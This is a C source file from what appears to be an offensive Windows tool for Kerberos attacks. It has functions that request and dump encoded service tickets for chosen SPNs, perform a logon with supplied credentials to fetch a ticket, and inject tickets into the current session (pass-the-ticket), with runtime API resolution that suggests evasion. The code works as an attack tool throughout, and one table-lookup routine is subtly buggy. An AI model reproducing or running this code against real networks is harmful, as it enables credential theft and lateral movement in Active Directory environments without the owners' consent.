#include "lsa.h"
#include "gate/gate.h"

#include "base64/base64.h"
#include "info/info.h"
#include <errhandlingapi.h>
#include <libloaderapi.h>
#include <stdio.h>
#include <string.h>
#include <windows.h>

map_entry EncryptionTypeTable[] = {
    {L"aes256", KERB_ETYPE_AES256_CTS_HMAC_SHA1_96},
    {L"aes128", KERB_ETYPE_AES128_CTS_HMAC_SHA1_96},
    {L"des", KERB_ETYPE_DES3_CBC_MD5},
    {L"rc4", KERB_ETYPE_RC4_HMAC_NT},
    {L"default", KERB_ETYPE_DEFAULT},
};
map_entry CacheOptions[] = {
    {L"cred", KERB_RETRIEVE_TICKET_AS_KERB_CRED},
    {L"cache_only", KERB_RETRIEVE_TICKET_USE_CREDHANDLE},
    {L"default", KERB_RETRIEVE_TICKET_DEFAULT},
};

HANDLE NewLsaCredentialHandle() {
  HMODULE secure32 = LoadLibraryA("secur32.dll");

  LsaConnectUntrusted_t LsaConnectUntrusted =
      (LsaConnectUntrusted_t)GetProcAddress(secure32, "LsaConnectUntrusted");
  HANDLE CredHandle;
  NTSTATUS status = LsaConnectUntrusted(&CredHandle);
  if (status != 0) {
    printf("0x%lX\n", status);
  }
  return CredHandle;
}

void InitLsaString(PLSA_STRING LsaStr, const char *str) {
  USHORT len = (USHORT)strlen(str);
  LsaStr->Buffer = (PCHAR)str;
  LsaStr->Length = len;
  LsaStr->MaximumLength = len + 1; // include null terminator
}

ULONG GetAuthPackage(HANDLE lsaHandle, char *PackageName) {
  LSA_STRING PackageNameStr;
  HMODULE secure32 = LoadLibraryA("secur32.dll");
  LsaLookupAuthenticationPackage_t LsaLookupAuthenticationPackage =
      (LsaLookupAuthenticationPackage_t)GetProcAddress(
          secure32, "LsaLookupAuthenticationPackage");
  InitLsaString(&PackageNameStr, PackageName);
  ULONG PackageNum;
  NTSTATUS status =
      LsaLookupAuthenticationPackage(lsaHandle, &PackageNameStr, &PackageNum);
  if (status != 0) {
    printf("0x%lX\n", status);
  }

  return PackageNum;
}

int LookupTableType(LPCWSTR input, map_entry table[]) {
  int defaultValue;
  for (int i = 0; i < sizeof(table) / sizeof(map_entry); i++) {
    if (_wcsicmp(L"default", table[i].name) == 0) {
      defaultValue = table[i].value;
    }
    if (_wcsicmp(input, table[i].name) == 0) {
      return table[i].value;
    }
  }
  return defaultValue;
}

// Requests a TGS NOT TGT.
NTSTATUS
Kerberos_ask(PCWCHAR targetName, char *filename, LPCWSTR EncryptionType,
             LPCWSTR CacheOption, void *credHandle) {
  wprintf(L"Requesting ticket for: %s\n", targetName);
  NTSTATUS status;
  size_t ntdll = get_mod_base("ntdll.dll");
  RtlCopyMemory_t RtlCopyMemory =
      (RtlCopyMemory_t)get_function_from_exports(ntdll, "RtlCopyMemory");
  HMODULE secure32 = LoadLibraryA("secur32.dll");
  LsaCallAuthenticationPackage_t LsaCallAuthenticationPackage =
      (LsaCallAuthenticationPackage_t)GetProcAddress(
          secure32, "LsaCallAuthenticationPackage");

  PKERB_RETRIEVE_TKT_REQUEST pKerbRetrieveReq;
  PKERB_RETRIEVE_TKT_RESPONSE pKerbRetrieveResp = NULL;
  ULONG szResponse = 0;
  USHORT dwTarget = (USHORT)((wcslen(targetName) + 1) * sizeof(wchar_t));
  DWORD szRequest = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;

  DWORD szData;
  // USHORT dwTarget;
  OssBuf buf = {0, NULL};
  dwTarget = (USHORT)((wcslen(targetName) + 1) * sizeof(wchar_t));

  szData = sizeof(KERB_RETRIEVE_TKT_REQUEST) + dwTarget;
  pKerbRetrieveReq = (PKERB_RETRIEVE_TKT_REQUEST)LocalAlloc(LPTR, szRequest);

  pKerbRetrieveReq->MessageType = KerbRetrieveEncodedTicketMessage;
  pKerbRetrieveReq->CacheOptions = KERB_RETRIEVE_TICKET_AS_KERB_CRED |
                                   LookupTableType(CacheOption, CacheOptions);
  if (LookupTableType(CacheOption, CacheOptions) ==
      KERB_RETRIEVE_TICKET_USE_CREDHANDLE) {

    pKerbRetrieveReq->CredentialsHandle = *(SecHandle *)credHandle;
  }

  pKerbRetrieveReq->EncryptionType = LookupTableType(
      EncryptionType,
      EncryptionTypeTable); // LookupEncryptionType(EncryptionType);
  pKerbRetrieveReq->TargetName.Length = dwTarget - sizeof(wchar_t);
  pKerbRetrieveReq->TargetName.MaximumLength = dwTarget;
  pKerbRetrieveReq->TargetName.Buffer =
      (PWSTR)((PBYTE)pKerbRetrieveReq + sizeof(KERB_RETRIEVE_TKT_REQUEST));
  RtlCopyMemory(pKerbRetrieveReq->TargetName.Buffer, targetName,
                pKerbRetrieveReq->TargetName.MaximumLength);

  HANDLE LsaHandle = NewLsaCredentialHandle();
  ULONG AuthPackageNum = GetAuthPackage(LsaHandle, "Kerberos");
  NTSTATUS protocolStatus;
  status = LsaCallAuthenticationPackage(
      LsaHandle, AuthPackageNum, pKerbRetrieveReq, szRequest,
      (PVOID *)&pKerbRetrieveResp, &szResponse, &protocolStatus);
  if (status != 0) {
    return status;
  }

  status = protocolStatus;
  if (status != 0) {
    return status;
  }
  buf.length = pKerbRetrieveResp->Ticket.EncodedTicketSize;
  buf.value = pKerbRetrieveResp->Ticket.EncodedTicket;
  printf("%s\n",
         base64_encode(pKerbRetrieveResp->Ticket.EncodedTicket, buf.length));
  HANDLE hfile;
  DWORD bytesWritten;
  hfile = CreateFile(filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS,
                     FILE_ATTRIBUTE_NORMAL, NULL);
  if (hfile == INVALID_HANDLE_VALUE) {
    return GetLastError();
  }
  BOOL result = WriteFile(hfile, buf.value, buf.length, &bytesWritten, NULL);
  if (!result) {
    return GetLastError();
  }
  CloseHandle(hfile);

  return status;
}

NTSTATUS PreAuth(char *user, char *passwd, char *domain, char *spn,
                 char *filename) {
  HANDLE hLsa;
  OssBuf buf = {0, NULL};
  HMODULE secure32 = LoadLibraryA("secur32.dll");
  LsaLogonUser_t LsaLogonUser =
      (LsaLogonUser_t)GetProcAddress(secure32, "LsaLogonUser");
  LsaCallAuthenticationPackage_t LsaCallAuthenticationPackage =
      (LsaCallAuthenticationPackage_t)GetProcAddress(
          secure32, "LsaCallAuthenticationPackage");
  NTSTATUS status;
  hLsa = NewLsaCredentialHandle();
  LONG authpackage;
  LSA_STRING originName;
  authpackage = GetAuthPackage(hLsa, "Kerberos");
  ULONG userLen = strlen(user);
  ULONG domainLen = strlen(domain);
  ULONG passwdLen = strlen(passwd);
  WCHAR wUser[256], wDomain[256], wPasswd[256];
  MultiByteToWideChar(CP_ACP, 0, user, -1, wUser, 256);
  MultiByteToWideChar(CP_ACP, 0, domain, -1, wDomain, 256);
  MultiByteToWideChar(CP_ACP, 0, passwd, -1, wPasswd, 256);
  ULONG authInfoSize = sizeof(KERB_INTERACTIVE_LOGON) + (wcslen(wUser) * 2) +
                       (wcslen(wDomain) * 2) + (wcslen(wPasswd) * 2);
  PKERB_INTERACTIVE_LOGON authInfo =
      (PKERB_INTERACTIVE_LOGON)calloc(1, authInfoSize);
  authInfo->MessageType = KerbInteractiveLogon;
  PBYTE ptr = (PBYTE)(authInfo + 1);

  authInfo->UserName.Buffer = (PWSTR)ptr;
  authInfo->UserName.Length = wcslen(wUser) * 2;
  authInfo->UserName.MaximumLength = authInfo->UserName.Length;
  memcpy(ptr, wUser, authInfo->UserName.Length);
  ptr += authInfo->UserName.Length;

  authInfo->LogonDomainName.Buffer = (PWSTR)ptr;
  authInfo->LogonDomainName.Length = wcslen(wDomain) * 2;
  authInfo->LogonDomainName.MaximumLength = authInfo->LogonDomainName.Length;
  memcpy(ptr, wDomain, authInfo->LogonDomainName.Length);
  ptr += authInfo->LogonDomainName.Length;

  authInfo->Password.Buffer = (PWSTR)ptr;
  authInfo->Password.Length = wcslen(wPasswd) * 2;
  authInfo->Password.MaximumLength = authInfo->Password.Length;
  memcpy(ptr, wPasswd, authInfo->Password.Length);
  originName.Buffer = "munchy";
  originName.Length = 6;
  originName.MaximumLength = 7;

  TOKEN_SOURCE sourceContext;
  memcpy(sourceContext.SourceName, "munchy  ", 8);
  AllocateLocallyUniqueId(&sourceContext.SourceIdentifier);
  HANDLE hToken;
  LUID logonId;
  LUID *pLogonId = &logonId;
  QUOTA_LIMITS quotas;
  NTSTATUS subStatus;
  PVOID profileBuffer;
  ULONG profileLen;
  status = LsaLogonUser(hLsa, &originName,
                        Interactive, // logon type
                        authpackage, authInfo, authInfoSize, NULL,
                        &sourceContext, &profileBuffer, &profileLen,
                        &logonId, // <-- this is the LUID of the new session
                        &hToken, &quotas, &subStatus);
  free(authInfo);
  if (status != 0) {
    return status;
  }

  // Now request the ticket using the new session's LUID
  ULONG spnLen = strlen(spn);
  ULONG reqSize = sizeof(KERB_RETRIEVE_TKT_REQUEST) + (spnLen * sizeof(WCHAR));
  PKERB_RETRIEVE_TKT_REQUEST req =
      (PKERB_RETRIEVE_TKT_REQUEST)calloc(1, reqSize);

  req->MessageType = KerbRetrieveEncodedTicketMessage;
  req->LogonId = logonId; // <-- target the new session
  req->CacheOptions =
      KERB_RETRIEVE_TICKET_DONT_USE_CACHE | KERB_RETRIEVE_TICKET_AS_KERB_CRED;
  req->EncryptionType = 0;

  PWCHAR spnBuf = (PWCHAR)(req + 1);
  MultiByteToWideChar(CP_ACP, 0, spn, -1, spnBuf, spnLen + 1);
  req->TargetName.Buffer = spnBuf;
  req->TargetName.Length = spnLen * sizeof(WCHAR);
  req->TargetName.MaximumLength = req->TargetName.Length + sizeof(WCHAR);

  PKERB_RETRIEVE_TKT_RESPONSE resp = NULL;
  ULONG respLen;
  NTSTATUS protocolStatus;
  status =
      LsaCallAuthenticationPackage(hLsa, authpackage, req, reqSize,
                                   (PVOID *)&resp, &respLen, &protocolStatus);
  printf("status: 0x%lX\n", protocolStatus);
  if (status == 0 && protocolStatus == 0) {

    buf.length = resp->Ticket.EncodedTicketSize;
    buf.value = resp->Ticket.EncodedTicket;
    //*ticketLen = resp->Ticket.EncodedTicketSize;
    printf("EncodedTicketSize: %lu\n",
           resp ? resp->Ticket.EncodedTicketSize : 0);
    HANDLE hfile;
    DWORD bytesWritten;
    hfile = CreateFile(filename, GENERIC_ALL, 0, NULL, CREATE_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL, NULL);
    if (hfile == INVALID_HANDLE_VALUE) {
      return GetLastError();
    }
    BOOL result = WriteFile(hfile, buf.value, buf.length, &bytesWritten, NULL);
    if (!result) {
      return GetLastError();
    }
    CloseHandle(hfile);

    //*ticketOut = (PBYTE)malloc(*ticketLen);
    // memcpy(*ticketOut, resp->Ticket.EncodedTicket, *ticketLen);
  }

  return status;
}

NTSTATUS Ptt(PVOID data, DWORD dataSize) {
  NTSTATUS status, protocolStatus;
  DWORD submitSize, responseSize;
  PKERB_SUBMIT_TKT_REQUEST pKerbSubmit;
  PVOID dumPtr;

  // get important functions.
  size_t ntdll = get_mod_base("ntdll.dll");
  RtlCopyMemory_t RtlCopyMemory =
      (RtlCopyMemory_t)get_function_from_exports(ntdll, "RtlCopyMemory");
  HMODULE secure32 = LoadLibraryA("secur32.dll");
  LsaCallAuthenticationPackage_t LsaCallAuthenticationPackage =
      (LsaCallAuthenticationPackage_t)GetProcAddress(
          secure32, "LsaCallAuthenticationPackage");
  if (!LsaCallAuthenticationPackage) {
    printf("GetProcAddress failed: 0x%lx\n", GetLastError());
    return -1;
  }

  // build submit
  submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + dataSize;
  pKerbSubmit = (PKERB_SUBMIT_TKT_REQUEST)LocalAlloc(LPTR, submitSize);
  pKerbSubmit->MessageType = KerbSubmitTicketMessage;
  pKerbSubmit->KerbCredSize = dataSize;
  pKerbSubmit->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
  pKerbSubmit->LogonId.HighPart = 0;
  pKerbSubmit->LogonId.LowPart = 0;
  RtlCopyMemory((PBYTE)pKerbSubmit + pKerbSubmit->KerbCredOffset, data,
                dataSize);
  HANDLE hlsa = NewLsaCredentialHandle();
  LONG kerb = GetAuthPackage(hlsa, "Kerberos");
  status = LsaCallAuthenticationPackage(hlsa, kerb, pKerbSubmit, submitSize,
                                        &dumPtr, &responseSize,
                                        &protocolStatus); // submit ticket!
  printf("status: 0x%lX, protocolStatus: 0x%lX\n", status, protocolStatus);
  if (status != 0) {
    LocalFree(pKerbSubmit);
    return status;
  }
  status = protocolStatus;
  LocalFree(pKerbSubmit);

  return status;
}
